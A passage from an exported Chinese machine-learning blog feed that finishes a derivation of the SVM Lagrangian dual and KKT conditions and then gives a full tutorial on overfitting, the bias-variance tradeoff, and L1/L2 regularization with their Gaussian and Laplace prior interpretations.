0\\)），我们内层优化取max，因此\\(\\alpha_i = \\infty \\Rightarrow \\alpha_ig_i({\\bf x}) = \\infty\\) 当g满足约束条件的时候（\\(g_i(x) \\le 0\\)），我们内层优化取max，因此\\(\\alpha_i =0 \\Rightarrow \\alpha_ig_i({\\bf x}) = 0\\) 当h不满足约束条件的时候（\\(h_j(x) \\ne0\\)），同理可以取\\(\\beta_j= \\rm sign(h_j({\\bf x})) \\infty \\Rightarrow \\beta_jh_j({\\bf x}) = \\infty\\) 当h满足约束条件的时候（\\(h_j(x) =0\\)），同理可以取\\(\\beta_jh_j({\\bf x}) =0\\) 为了使2-1达到优值，需要满足如下条件（KKT条件）： 主问题可行： \\(g_i({\\bf x}) \\le 0, h_i({\\bf x}) = 0\\) 对偶问题可行： \\(\\alpha_i \\ge 0\\) 互补松弛: \\(\\alpha_i g_i({\\bf x}) = 0\\) 主问题可行是上面推导的结果，对偶问题可行为2-1的约束项。 互补松弛是主问题和对偶问题都可行的条件下的最大值。 拉格朗日对偶问题 定义2-1的对偶问题为： \\[ \\begin{align*} \\max_{ {\\boldsymbol \\alpha}, {\\boldsymbol \\beta} }\\min_{ {\\bf x} } &amp; \\tag{2-2}\\hspace{3ex} \\mathcal{L({\\bf x},{\\boldsymbol \\alpha}, {\\boldsymbol \\beta})} \\\\ {\\rm s.t.} &amp; \\hspace{3ex} \\alpha_i \\ge 0 \\end{align*} \\] 对偶问题是原问题的下界，即： \\[ \\max_{ {\\boldsymbol \\alpha}, {\\boldsymbol \\beta} }\\min_{ {\\bf x} } \\mathcal{L({\\bf x},{\\boldsymbol \\alpha}, {\\boldsymbol \\beta})} \\le \\min_{ {\\bf x} } \\max_{ {\\boldsymbol \\alpha}, {\\boldsymbol \\beta} } \\mathcal{L({\\bf x},{\\boldsymbol \\alpha}, {\\boldsymbol \\beta})} \\] 因为总是有 \\(\\min_{ {\\bf x} } \\mathcal{L({\\bf x},{\\boldsymbol \\alpha}, {\\boldsymbol \\beta})} \\le\\min_{ {\\bf x} } \\max_{ {\\boldsymbol \\alpha}, {\\boldsymbol \\beta} } \\mathcal{L({\\bf x},{\\boldsymbol \\alpha}, {\\boldsymbol \\beta})}\\) 成立，对任意可能的值求极值，肯定不如直接求到的极值大。有句俗语叫“瘦死的骆驼比马大”说的就是这个道理。 2-2只是交换了max-min的顺序，得到的就是拉格朗日对偶问题。 SVM 对偶问题推导 首先变换SVM原问题为： \\[ \\begin{align*} \\min_{\\bf w,b}\\hspace{3ex} &amp; \\frac{1}{2} {\\bf w^Tw}\\\\ {\\rm s.t.}\\hspace{3ex} &amp; 1 - y_i({\\bf w^T x_i} + b) \\le0, \\hspace{3ex}i=1,2,\\cdots ,n \\end{align*} \\] 可以写出拉格朗日函数如下： \\[ \\mathcal{L({\\bf w},b,{\\boldsymbol \\alpha})} =\\frac{1}{2} {\\bf w^Tw} + \\sum_{i=1}^n\\alpha_i \\left( 1 - y_i({\\bf w^T x_i} + b) \\right) , \\alpha_i \\ge 0 \\tag{2-3} \\] 根据拉格朗日对偶性，得到对偶问题为： \\[ \\begin{align*} \\max_{ {\\boldsymbol \\alpha} }\\min_{ {\\bf w} , b} &amp; \\hspace{3ex} \\mathcal{L({\\bf w},b,{\\boldsymbol \\alpha})} \\\\ {\\rm s.t.} &amp; \\hspace{3ex} \\alpha_i \\ge 0, i = 1,2,\\cdots ,n \\end{align*}\\tag{2-4} \\] 求解\\(\\min_{ {\\bf w} , b} \\mathcal{L({\\bf w},b,{\\boldsymbol \\alpha})}\\)，拉格朗日函数2-3分别对w和b求偏导，得： \\[ \\frac{\\partial\\mathcal{L({\\bf w},b,{\\boldsymbol \\alpha})} }{\\partial{\\bf w} } = {\\bf w} - \\sum_{i=1}^n\\alpha_iy_i{\\bf x_i}\\\\ \\frac{\\partial\\mathcal{L({\\bf w},b,{\\boldsymbol \\alpha})} }{\\partial b} = -\\sum_{i=1}^n \\alpha_iy_i \\] 令偏导为0，得: \\[ {\\bf w} = \\sum_{i=1}^n \\alpha_iy_i{\\bf x_i}\\tag{2-5} \\] \\[ \\sum_{i=1}^n \\alpha_iy_i = 0 \\tag{2-6} \\] 带入拉格朗日函数2-3得： \\[ \\min_{ {\\bf w},b}\\mathcal{L({\\bf w},b,{\\boldsymbol \\alpha})} = \\sum_{i=1}^n\\alpha_i-\\frac{1}{2} \\sum_{i=1}^n\\sum_{j=1}^n \\alpha_i\\alpha_j y_iy_j{\\bf x_i ^Tx_j} \\] 再对\\(\\min_{ {\\bf w},b}\\mathcal{L({\\bf w},b,{\\boldsymbol \\alpha})}\\)求极大值得到对偶问题： \\[ \\begin{align*} \\max_{ {\\boldsymbol \\alpha} }&amp; \\hspace{3ex}\\sum_{i=1}^n\\alpha_i-\\frac{1}{2} \\sum_{i=1}^n\\sum_{j=1}^n \\alpha_i\\alpha_j y_iy_j{\\bf x_i ^Tx_j}\\\\\\tag{2-7} {\\rm s.t.} &amp; \\hspace{3ex} \\alpha_i \\ge 0, i = 1,2,\\cdots ,n\\\\ &amp; \\hspace{3ex} \\sum_{i=1}^n \\alpha_iy_i = 0 \\end{align*} \\] 注意我们把\\({\\bf w} = \\sum_{i=1}^n \\alpha_iy_i{\\bf x_i}\\)去掉了，因为这里求的是\\(\\alpha\\)使得问题最大，和w无关。 2-7就是我们的SVM对偶问题。需要满足的KKT条件为： 主问题可行： \\(1 - y_i({\\bf w^T x_i} + b) \\le0\\) 对偶问题可行：\\(\\alpha_i \\ge 0\\) 互补松弛: \\(\\alpha_i \\left( 1 - y_i({\\bf w^T x_i} + b) \\right) = 0\\) 2-5和2-6的条件: \\({\\bf w} = \\sum_{i=1}^n \\alpha_iy_i{\\bf x_i} ; \\sum_{i=1}^n \\alpha_iy_i = 0\\) PS: 周志华老师的KKT条件中没有2-5和2-6两式，而李航老师和林轩田老师的都有。 笔者认为也应该加上: ) 这里有个很有意思的结论： 由于我们总有\\(\\alpha_i \\ge 0\\)，当\\(\\alpha_i &gt; 0\\)时，\\(y_i({\\bf w^T x_i} + b) = 1\\) ,此时所对应的样本点位于最大间隔边界上，是一个支持向量。这显示出一个重要的性质：训练完之后，大部分的训练样本都不需要保留，最终模型只与支持向量有关（同时也暗示复杂度主要与支持向量的数目有关）。 求解对偶问题 2-7所表示的SVM对偶问题仍可以用二次规划算法来求解，但是问题规模正比于训练样本数，在实际任务中开销很大。往往采用更高效的算法如SMO或者 Pegasos ，这将在最后介绍。 假设求解出了\\(\\alpha\\), 那么根据KKT条件, 可得： \\({\\bf w} = \\sum_{i=1}^n \\alpha_iy_i{\\bf x_i}\\)， 选取一个\\(\\alpha_i \\gt 0\\) 可得\\(y_i({\\bf w^T x_i} + b) = 1 \\Rightarrow {\\bf w^T x_i} + b= y_i \\Rightarrow b = y_i - {\\bf w^T x_i}\\) 观察对偶支持向量机求解可以发现对偶问题的好处为： 只需要优化\\(\\alpha\\)而不是b和w，降低了算法的时间复杂度 通过查看\\(a_i &gt; 0\\) 便可找出支持向量 求得w和b即可构造超平面和对应的决策函数，和感知机一样： \\[ \\rm g_{svm}({\\bf x}) = \\rm sign({\\bf w^Tx }+b) \\] 小结 若进行空间变换\\({\\bf z} = \\Phi({\\bf x})\\)则： \\[ \\rm g_{svm}({\\bf z}) = \\rm sign({\\bf w^Tz }+b) \\] 原始的SVM和对偶SVM对比如下表： 变量个数 适用情况 物理意义 原始SVM \\(\\tilde{d}+1\\) 数据维度较小 对(w, b)进行缩放，得到一个合适的值 对偶SVM n 数据量比较小 找出支持向量和对应的\\(\\alpha\\) 回想一下SVM对偶问题的初衷是避免对对数据维度\\(\\tilde{d}\\)的依赖。虽然我们的对偶问题看上去最后求解时只依赖了数据量n，但是看看目标函数将会有一个\\({\\bf z_i^Tz_j}\\)的内积（将x都映射到z），直接计算的话复杂度仍是\\(O(\\tilde{d})\\)，如何避免内积计算，请看下一篇 SVM的核函数讲解。 参考资料 机器学习技法 - 林轩田 《统计学习方法》 - 李航 《机器学习》 - 周志华 《从零构建支持向量机(SVM)》 - 张皓","categories":[{"name":"study","slug":"study","permalink":"https://www.hrwhisper.me/categories/study/"},{"name":"机器学习","slug":"study/机器学习","permalink":"https://www.hrwhisper.me/categories/study/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://www.hrwhisper.me/tags/Machine-Learning/"},{"name":"Machine Learning model","slug":"Machine-Learning-model","permalink":"https://www.hrwhisper.me/tags/Machine-Learning-model/"}]},{"title":"『我爱机器学习』过拟合、欠拟合和正则化","slug":"machine-learning-regularization","date":"2018-03-13T03:21:03.000Z","updated":"2020-10-19T14:35:48.806Z","comments":true,"path":"machine-learning-regularization/","link":"","permalink":"https://www.hrwhisper.me/machine-learning-regularization/","excerpt":"本文介绍： 过拟合和欠拟合 正则化 正则化逻辑回归","text":"本文介绍： 过拟合和欠拟合 正则化 正则化逻辑回归 过拟合和欠拟合 什么是过拟合呢？ 一个很直观的图如下： overfitting2 给定一些点让你进行拟合，上图中间的图很好的完成了任务。而第一个图采用一条直线，过于简单，称为欠拟合（Underfitting），而最后一个图画出了弯弯曲曲的曲线，看上去拟合效果很好，但其实过于复杂，称为过拟合（Overfitting）。 简单的说： 太简单----欠拟合，没有充分的挖掘数据间的规律 太复杂----过拟合，过分挖掘数据间的规律了 还不知道？看看下面的最后一个图: overfitting 竟然画了一只猫！想象力太丰富啦 : ) 危害 欠拟合的危害就是在你的训练数据上表现也不高，更不要说在验证集上了。 过拟合在训练集上做得很好，但是模型的泛化能力差，好比学生在平时练习的时候，把作业答案都背了下来，而考试的时候老师把题目的数字稍微一改，就不会做了。 总而言之，欠拟合和过拟合都会使你模型的效果不好。 判断欠拟合和过拟合 在介绍如何判断过拟合还是欠拟合前，顺带介绍一下两个概念：偏差(Bias)和方差(Variance) 偏差Bias： 描述模型输出结果与真实结果的差距，即刻画的是算法的拟合能力。Bias高说明你的模型拟合效果不好。低Bias对应的就是下图中点都在靶心附近，即瞄得比较准。 方差Variance：度量了同样大小的训练集的变动所导致的学习性能的变化，即刻画了数据扰动所造成的影响。Variance太大说明模型不稳定。低Variance就是下图中点比较集中，即手比较稳。 一张形象的图如下： bias-variance 好了，接下来说说如何判断过拟合和欠拟合。 前面提到，欠拟合就是想得太简单，想要用太简单的模型去做超过了这个模型的描述能力,或者说你的特征不够不足以描述数据，因此在训练集和测试集上效果都不好，此时模型的Bias很大。 而过拟合则是太复杂，模型过于复杂，对训练集的数据过于充分的拟合，因此在训练集上效果很好，但是测试集上就很差。此时模型的Variance很大。 这里，有一个机器学习的思想就是，偏差Bias和方差Variance的tradeoff。 如果想要做到低Bias，得复杂化模型，增加模型的参数，但这样容易过拟合，过拟合对应上图是high variance，点很分散，虽然瞄得准，但手不一定稳。 而要做到低Variance，就要简化模型，减少模型的参数，但这样容易欠拟合，欠拟合对应上图是high bias，点偏离中心。低variance对应就是点都打的很集中，但不一定是靶心附近，手很稳，但是瞄的不准。 有人对这个tradeoff解释得十分通俗易懂，这里摘录如下： 我们训练一个模型的最终目的，是为了让这个模型在测试数据上拟合效果好，也就是Error(test)比较小，但在实际问题中，test data我们是拿不到的，也根本不知道test data的内在规律（如果知道了，还machine learning干啥 ），所以我们通过什么策略来减小Error(test)呢？ 分两步： 让Error(train)尽可能小 让Error(train)尽可能等于Error(test) 三段论，因为A小，而且A=B，这样B就小。 那么怎么让Error(train)尽可能小呢？——》把模型复杂化，把参数搞得多多的，这个好理解，十元线性回归，肯定error要比二元线性回归低啊。——》low bias 然后怎么让Error(train)尽可能等于Error(test)呢？——》把模型简单化，把参数搞得少少的。什么叫Error(train)=Error(test)？就是模型没有偏见，对train test一视同仁。那么怎样的模型更容易有这这种一视同仁的特性，换句话说，更有『通用性』，对局部数据不敏感？那就是简单的模型。——》low variance 我们想要Bias和Variance都要做到比较小，而这两个又是比较矛盾的，一个是要模型复杂，一个是要模型简单，因此干脆就中庸一点把，就是取中间，做一个tradeoff。有一个直观的图如下： bias-variance-and-model-complexity 一开始复杂度低，训练集和测试集效果都不好。 之后提升模型复杂度，训练集上是做好了，但是结果发生了过拟合，测试集上的错误反而变高。 这里先小小的剧透一下，之后会提到正则化，而正则化用于限制模型复杂度，这正是tradeoff的体现。 常见解决办法 对于欠拟合，可以 增加新特征 增加模型复杂度，如原来线性模型，改用非线性模型 有正则化项可以减少正则项参数 对于过拟合，可以 增加数据集 降低模型复杂度，使用简单点的模型 特征选择 正则化 已经有正则化项则加大正则化参数 集成学习方法 正则化 前面提到，正则化可以防止模型过拟合。正则化的作用是对复杂的模型进行调整，使复杂模型“变成”比较简单的模型，可以说是降低方差。 下面介绍L1和L2正则这两个常见的正则化方法。 L2正则 回顾一下我们之前讲的线性回归问题： \\[ f({\\bf x}) = {\\bf w^T x} + b \\] 这个模型可能过于简单，比如超平面应该是圆形的情况我们用这模型就没办法做得很好。因此我们可能将其做非线性变换到z空间：\\({\\bf z} = \\boldsymbol{\\Phi}_Q({\\bf x}) = (1, x, x^2, \\ldots, x^Q)\\) \\[ f({\\bf x}) = {\\bf w^T {\\bf z}} \\] 如Q=2和Q=10得到 \\[ \\begin{align*} \\mathcal{H}_{10} &amp;: w_0 + w_1x + w_2x^2 + w_3x^3 + \\ldots + w_{10}x^{10} \\\\ \\mathcal{H}_2 &amp;: w_0 + w_1x+w_2x^2 \\end{align*} \\] 然后进行线性的学习，然后进行预测。当Q很大的时候，这个模型很容易过拟合。模型的 从结果上看，Q=2其实是Q=10的时\\(w_3 = \\ldots = w_{10}=0\\)的结果，即简单的模型可以用复杂的模型表示。 我们希望模型不那么复杂，又有一定的表现能力，为此，我们可以让模型的系数的非0项尽可能的少，比如小于3个 \\[ \\begin{align*} \\min_{ {\\bf w}} &amp;\\hspace{2ex} \\frac{1}{N}\\sum_{i=1}^N({\\bf w}^\\mathsf{T}{\\bf z}_i - y_i)^2 \\\\ {\\rm s.t.} &amp;\\hspace{2ex} \\sum_{q=0}^{d}[\\![w_q \\not= 0]\\!] \\le 3\\tag{2-1} \\end{align*} \\] 得到的新模型\\(\\mathcal{H}_2 \\subset \\mathcal{H}_2&#39; \\subset \\mathcal{H}_{10}\\)（表达能力强于\\(\\mathcal{H}_2\\)，风险能力弱于\\(\\mathcal{H}_{10}\\)），但这是一个NP问题，退而求其次，可以让平方和小于某个常数，即： \\[ \\begin{align*} \\min_{ {\\bf w}} &amp;\\hspace{2ex} {\\rm E_{in}} =\\frac{1}{N}\\sum_{i=1}^N({\\bf w}^\\mathsf{T}{\\bf z}_i - y_i)^2 \\\\ {\\rm s.t.} &amp;\\hspace{2ex} \\sum_{q=0}^{d}w_q^2 \\le C \\end{align*} \\] 写成矩阵的形式就是： \\[ \\begin{align*} \\min_{ {\\bf w}} &amp;\\hspace{2ex}E_{\\rm in}({\\bf w}) = \\frac{1}{N}({\\rm Z}{\\bf w} - {\\bf y})^\\mathsf{T}({\\rm Z}{\\bf w} - {\\bf y}) \\\\ {\\rm s.t.} &amp;\\hspace{2ex} {\\bf w}^\\mathsf{T}{\\bf w} \\le C \\end{align*} \\] 如何求解这个问题？从几何意义上讲，限制条件把w限制在了一个半径为C的超球体中，如下图所示： lagrange-multiplier-l2-regular 紫色的点标识出当前w对应\\(E_{\\rm in}\\)的位置，其蓝线为这个时刻\\(E_{\\rm in}\\)的一条等高线（上面的值都相等），本来根据梯度下降法，沿着负梯度方向\\(-\\nabla E_{\\rm in}\\)向下滚动减少目标值。但是限制有了限制条件，不能跑出这个超球体，因此只能沿着\\(-\\nabla E_{\\rm in}\\)的分量（绿色的方向）移动，移动到什么位置就不能移动了呢？即超球体的切线方向和\\(-\\nabla E_{\\rm in}\\)垂直，也就是最优的\\(\\bf w_{REG}\\)必然与\\(-\\nabla E_{\\rm in}\\)方向平行,设比例为\\(\\frac{2\\lambda}{N}\\) \\[ \\nabla E_{\\rm in}({\\bf w}_{\\rm REG}) + \\frac{2\\lambda}{N} {\\bf w}_{\\rm REG} = 0\\tag{2-3} \\] PS：其实这就是拉格朗日乘子法的几何意义，关于拉格朗日乘子法和KKT条件，会在之后深入理解SVM章节继续介绍并大量使用。 求\\(E_{\\rm in}\\)梯度并带入2-3，得： \\[ \\begin{align*} \\frac{2}{N} ({\\rm Z}^\\mathsf{T}{\\rm Z}{\\bf w}_{\\rm REG} - {\\rm Z}^\\mathsf{T}{\\bf y}) + \\frac{2\\lambda}{N}{\\bf w}_{\\rm REG} = 0 \\hspace{2ex} \\Rightarrow{\\bf w}_{\\rm REG} = ({\\rm Z^\\mathsf{T}Z + \\lambda I})^{-1}{\\rm Z}^\\mathsf{T}{\\bf y} \\end{align*} \\] 给定λ&gt;0，由于\\(\\bf Z^TZ\\)是半正定矩阵，\\(λI\\)是正定矩阵，两者相加也是正定矩阵，因此\\(\\bf Z^TZ+λI\\)存在逆矩阵，上式总可求解。 其实还可以把2-3写为： \\[ L({\\bf w}, \\lambda) = ({\\rm Z}{\\bf w} - {\\bf y})^\\mathsf{T}({\\rm Z}{\\bf w} - {\\bf y}) + \\lambda {\\bf w^Tw} \\tag{2-4} \\] 然后求解2-4效果是一样的。 矩阵太可怕了？≡(▔﹏▔)≡ 那改成平易近人的写法就是： \\[ \\min_{ {\\bf w}} \\hspace{1ex} \\sum_{i=1}^N({\\bf w}^\\mathsf{T}{\\bf z}_i - y_i)^2 + \\lambda |\\!|{\\bf w}|\\!|_2^2 \\tag{2-5} \\] 式2-5也常称为岭回归(ridge regression)。最后一项就称为L2正则化项。\\(\\lambda\\)称为正则化项系数。\\(\\lambda\\)越大，w就越小，其范数C也就越小，但也越容易欠拟合。 林轩田老师给出了不同\\(\\lambda\\)的效果图 l2-lambda-result L1正则 2-5式的最后一项进行修改就得到了L1正则 \\[ \\min_{ {\\bf w}} \\hspace{1ex} \\sum_{i=1}^N({\\bf w}^\\mathsf{T}{\\bf z}_i - y_i)^2 + \\lambda |\\!|{\\bf w}|\\!|_1 \\tag{2-6} \\] L1正则也被称为LASSO(Least Absolute Shrinkage and Selection Operator)，L1正则和L2正则一样，都可以降低模型复杂度的风险，但是L1正则的好处是会得到一个稀疏解。这也是为什么L1正则不是处处可微仍广受青睐的原因。 为什么会得到一个系数解呢？上面我们提到L2正则相当于限制在一个超球体中，而L1正则则相当于限制在一个超正方体中。假设二维的情况，如下图所示: l1-regular 类似之前的L2正则，由于限制条件的存在，往负梯度方向\\(-\\nabla E_{\\rm in}\\)移动时，只能沿着分量，这样才不会超出限制范围。只有当w的移动方向\\(-\\nabla E_{\\rm in}\\)与法向量（红色的箭头）垂直时，w达到最优解。可以看出w在正方形边界上的时候，这种情况一般不会发生，因此w会沿着负梯度方向的一个分量不断移动，直到到达顶点处。在顶点处意味着和某坐标轴相交，即某些\\(w_i\\)的值为0，比如这里二维情况就是\\(w_1\\)或者\\(w_2\\)为0。而L2正则的解往往在某象限中，即\\(w_1\\)或者\\(w_2\\)非0。因此，L1比L2更易于得到稀疏解。 而对w取稀疏解意味着在初始的d个特征中仅有对应着w的非零分量的特征才会出现在最终模型中。求解L1正则的结果便是得到了仅采用一部分初始特征的模型。换言之，基于L1正则化的学习方法就是一种嵌入式特征选择方法，其特征选择和学习器的训练过程融为一体，同时完成。 关于L1更能得到稀疏解有另一种说法， L1正则化会让参数变得更加稀疏（更多的参数变为0），而L2不会,因为参数很小时如0.0001平方基本可以忽略了。 L1正则求解 前面提到过，L1正则不是处处可微的，求解起来不像L2正则那么容易。 求解L1正则可以用近端梯度下降（Proximal Gradient Descent），本文不做具体介绍，感兴趣的可以参阅周志华的《机器学习》第253页。 L0正则 什么，还有L0正则？木有错！ L0正则是非0元素的个数。其实上面我们提过式2-1就可以看成L0正则，这是一种很直观限制模型复杂度的方法。但是遗憾的是不连续难以优化求解。因此往往用L1正则近似。 基于后验理解正则化 上面的介绍可以说是用最优化约束条件来介绍正则话，其实还可以用先验和后验概率进行解释：正则化相当于对模型参数引入了先验分布。引入了正确的先验分布，可以在较小的数据集中有良好的泛化性能，也能有效的防止过拟合。 最大似然估计和最小二乘 为了阐述之后的L1、L2正则和先验分布的关系，我们先来个开胃菜，即没有引入正则化之前是什么样子的。 我们都比较熟悉高斯分布，设\\(x\\sim \\mathcal{N}(\\mu, \\sigma^2)\\),则高斯分布的概率密度函数为： \\[ p(x\\ |\\ \\mu,\\sigma^2) = \\frac{1}{\\sqrt{2\\pi} \\sigma} \\exp\\left(- \\frac{(x - \\mu)^2}{2\\sigma^2}\\right) \\] 其中\\(\\mu\\)为均值，\\(\\sigma^2\\)为方差。 gaussian-distribution 下面以最简单的线性回归为例，给定数据集\\(\\{({\\bf x_1}, y_1) , ({\\bf x_1}, y_1)),\\cdots,({\\bf x_n}, y_n))\\}\\), \\(y_i\\)和预测值\\({\\bf w^Tx_i}\\)之间的误差为\\(\\epsilon\\)，因此有下式： \\[ y_i = {\\bf w^Tx_i} + \\epsilon_i \\tag{2-7} \\] 假设\\(\\epsilon_i \\sim \\mathcal{N}(0, \\sigma^2)\\), 则 \\(y_i \\sim \\mathcal{N}({\\bf w^Tx, \\sigma^2})\\)，即给定数据 \\(\\bf x_i\\)和模型的参数\\(\\bf w\\)模型得到\\(y_i\\)的概率为： \\[ p(y_i| {\\bf w}, {\\bf x_i}) = \\frac{1}{\\sqrt{2\\pi} \\sigma} \\exp\\left(- \\frac{( y_i - {\\bf w^Tx_i})^2}{2\\sigma^2}\\right) \\] 我们可以用最大似然估计来求使得数据集出现最大的概率对应的参数\\(\\bf w\\)： \\[ \\begin{align*} \\arg \\max_w\\mathcal{L}({\\bf w}) &amp;= \\ln \\prod_{i=1}^n \\frac{1}{\\sqrt{2\\pi} \\sigma} \\exp\\left(- \\frac{( y_i - {\\bf w^Tx_i})^2}{2\\sigma^2}\\right)\\\\ &amp;= \\sum_{i=1}^n \\left(-\\ln \\sigma\\sqrt{2\\pi} - \\frac{( y_i - {\\bf w^Tx_i})^2}{2\\sigma^2} \\right)\\\\ &amp;= -\\frac{1}{2\\sigma^2}\\sum_{i=1}^n \\left(y_i - {\\bf w^Tx_i} \\right)^2 - n\\ln \\sigma\\sqrt{2\\pi} \\end{align*} \\] 我们想优化min的话，即取上式的相反数，于是有： \\[ \\begin{align*} \\arg \\min_w\\mathcal{L}({\\bf w}) &amp;= \\frac{1}{2\\sigma^2}\\sum_{i=1}^n \\left(y_i - {\\bf w^Tx_i} \\right)^2 + n\\ln \\sigma\\sqrt{2\\pi}\\\\ &amp;= \\sum_{i=1}^n \\left(y_i - {\\bf w^Tx_i} \\right)^2 \\hspace{4ex} 其它为常数，和优化无关 \\end{align*} \\] 这就得到了最小二乘。为什么呢？最小二乘想要求一条回归线，该回归线到数据点的平方距离之和最小。而当我们假设待求分布为高斯分布时，最大概率会在平均值附近找到，又因为高斯分布是对称的，相当于最小化数据点与平均值之间的距离。 高斯分布和L2正则 假设\\(\\epsilon_i \\sim \\mathcal{N}(0, \\sigma^2)\\), 参数\\(w_i \\sim \\mathcal{N}(0, \\xi^2)\\), 可以用MAP来求使得数据集出现最大的概率对应的参数\\(\\bf w\\)： \\[ \\begin{align*} \\arg \\max_w\\mathcal{L}({\\bf w}) &amp;= \\prod_{i=1}^n p(y_i | {\\bf w}, {\\bf x_i}) p({\\bf w})\\\\ &amp;=\\ln \\prod_{i=1}^n \\frac{1}{\\sqrt{2\\pi} \\sigma} \\exp\\left(- \\frac{( y_i - {\\bf w^Tx_i})^2}{2\\sigma^2}\\right) \\prod_{j=1}^d \\frac{1}{\\sqrt{2\\pi} \\xi} \\exp\\left(- \\frac{ w_j^2}{2\\xi^2}\\right)\\\\ &amp;=\\ln \\prod_{i=1}^n \\frac{1}{\\sqrt{2\\pi} \\sigma} \\exp\\left(- \\frac{( y_i - {\\bf w^Tx_i})^2}{2\\sigma^2}\\right) +\\ln\\prod_{j=1}^d \\frac{1}{\\sqrt{2\\pi} \\xi} \\exp\\left(- \\frac{w_j^2}{2\\xi^2}\\right)\\\\ &amp;= \\sum_{i=1}^n \\left(-\\ln \\sigma\\sqrt{2\\pi} - \\frac{( y_i - {\\bf w^Tx_i})^2}{2\\sigma^2}\\right) + \\sum_{j=1}^d \\left(- \\ln \\xi\\sqrt{2\\pi} - \\frac{ w_j^2}{2\\xi^2} \\right)\\\\ &amp;= -\\frac{1}{2\\sigma^2}\\sum_{i=1}^n \\left(y_i - {\\bf w^Tx_i} \\right)^2 - \\frac{1}{2\\xi^2}\\sum_{j=1}^dw_j^2 - n\\ln \\sigma\\sqrt{2\\pi} - d\\ln\\xi\\sqrt{2\\pi} \\end{align*} \\] 我们想优化min的话，即取上式的相反数，于是有： \\[ \\begin{align*} \\arg \\min_w\\mathcal{L}({\\bf w}) &amp;= \\frac{1}{2\\sigma^2}\\sum_{i=1}^n \\left(y_i - {\\bf w^Tx_i} \\right)^2 + \\frac{1}{2\\xi^2}\\sum_{j=1}^dw_j^2 + n\\ln \\sigma\\sqrt{2\\pi} +d\\ln\\xi\\sqrt{2\\pi}\\\\ &amp;= \\sum_{i=1}^n \\left(y_i - {\\bf w^Tx_i} \\right)^2 +\\frac{1}{2\\xi^2}{\\bf w^Tw}\\hspace{4ex} 其它为常数，和优化无关\\\\ &amp; = \\sum_{i=1}^n \\left(y_i - {\\bf w^Tx_i} \\right)^2 + \\lambda |\\!| {\\bf w}|\\!|_2^2 \\hspace{4ex} \\end{align*} \\] 这样就得到了L2范式，即岭回归！ 拉普拉斯分布和L1正则 拉普拉斯分布我们比较少见，它长什么样子呢？ \\[ p(x\\ |\\ \\mu,b) = \\frac{1}{2b} \\exp\\left(- \\frac{|x - \\mu|}{b}\\right) \\] 拉普拉斯分布的概率密度函数让我们联想到高斯分布，但是，高斯分布是用相对于 μ 平均值的差的平方来表示，而拉普拉斯概率密度用相对于平均值的差的绝对值来表示。因此，拉普拉斯分布的尾部比正态分布更加平坦。 laplace-distribution 假设\\(\\epsilon_i \\sim \\mathcal{N}(0, \\sigma^2)\\), 参数\\(w_i \\sim {\\text Laplace}(0, b)\\), 可以用MAP来求使得数据集出现最大的概率对应的参数\\(\\bf w\\)： \\[ \\begin{align*} \\arg \\max_w\\mathcal{L}({\\bf w}) &amp;= \\prod_{i=1}^n p(y_i | {\\bf w}, {\\bf x_i}) p({\\bf w})\\\\ &amp;=\\ln \\prod_{i=1}^n \\frac{1}{\\sqrt{2\\pi} \\sigma} \\exp\\left(- \\frac{( y_i - {\\bf w^Tx_i})^2}{2\\sigma^2}\\right) \\prod_{j=1}^d \\frac{1}{2b} \\exp\\left(- \\frac{ |w_j|}{b}\\right)\\\\ &amp;=\\ln \\prod_{i=1}^n \\frac{1}{\\sqrt{2\\pi} \\sigma} \\exp\\left(- \\frac{( y_i - {\\bf w^Tx_i})^2}{2\\sigma^2}\\right) +\\ln\\prod_{j=1}^d \\frac{1}{2b} \\exp\\left(- \\frac{|w_j|}{b}\\right)\\\\ &amp;= \\sum_{i=1}^n \\left(-\\ln \\sigma\\sqrt{2\\pi} - \\frac{( y_i - {\\bf w^Tx_i})^2}{2\\sigma^2} \\right) +\\sum_{j=1}^d\\left( -\\ln{2b} - \\frac{|w_j|}{b} \\right)\\\\ &amp;= -\\frac{1}{2\\sigma^2}\\sum_{i=1}^n \\left(y_i - {\\bf w^Tx_i} \\right)^2 - \\frac{1}{b}\\sum_{j=1}^d|w_j|- n\\ln \\sigma\\sqrt{2\\pi} - d\\ln2b \\end{align*} \\] 我们想优化min的话，即取上式的相反数，于是有： \\[ \\begin{align*} \\arg \\min_w\\mathcal{L}({\\bf w}) &amp;= \\frac{1}{2\\sigma^2}\\sum_{i=1}^n \\left(y_i - {\\bf w^Tx_i} \\right)^2 + \\frac{1}{b}\\sum_{j=1}^d|w_j|+ n\\ln \\sigma\\sqrt{2\\pi}+ d\\ln2b\\\\ &amp;= \\sum_{i=1}^n \\left(y_i - {\\bf w^Tx_i} \\right)^2 + \\frac{1}{b}\\sum_{j=1}^d|w_j| \\hspace{4ex} 其它为常数，和优化无关\\\\ &amp; = \\sum_{i=1}^n \\left(y_i - {\\bf w^Tx_i} \\right)^2 + \\lambda |\\!| {\\bf w}|\\!|_1 \\hspace{4ex} \\end{align*} \\] 这样就得到了L1范式。从上式也可以看出，\\(\\lambda\\)越大（正则化的权重），则相当于\\(b\\)越小，参数越集中在0附近，模型也就越简单。 此外，高斯分布在极值点（0处）是平滑的，也就是说高斯分布认为w在极值点附近取不同值的可能性是接近的，因此，L2正则只会让w更接近0，而不会等于0。而拉普拉斯分布在极值点（0处）是一个尖峰，所以参数取0的可能性更高。 正则化逻辑回归 前面已经正则化过线性回归了，回想上一讲的逻辑回归模型，我们同样可以加入正则化。 回想我们用极大似然法推导出来的损失函数为： \\[ L(w) =-\\sum_{i=1}^N [y_i\\ln h({\\bf x_i}) + (1-y_i)\\ln(1- h({\\bf x_i}))] \\] 我们可以加入L2正则化项： \\[ L(w) = -\\sum_{i=1}^N [y_i\\ln h({\\bf x_i}) + (1-y_i)\\ln(1- h({\\bf x_i}))]+ \\frac{\\lambda}{2} |\\!|{\\bf w}|\\!|^2 \\] L(w)对\\(\\bf w_j\\)求偏导，有： \\[ \\frac{\\partial L({\\bf w})}{w_j} = \\sum_{i=1}^N \\left(h({\\bf x_i}) -y_i \\right)x_{ij} + \\lambda w_j \\] 于是，w的更新公式为： \\[ w_j = w_j - \\eta\\left(\\sum_{i=1}^N(h({\\bf x_i}) -y_i )x_{ij} + \\lambda w_j\\right) \\] 其实就是多了一项而已，简单~ 参考资料 《机器学习》 周志华 机器学习基石 - 林轩田 （第14讲正则化） 机器学习防止欠拟合、过拟合方法 Laplace（拉普拉斯）先验与L1正则化 LR正则化与数据先验分布的关系？ - Charles 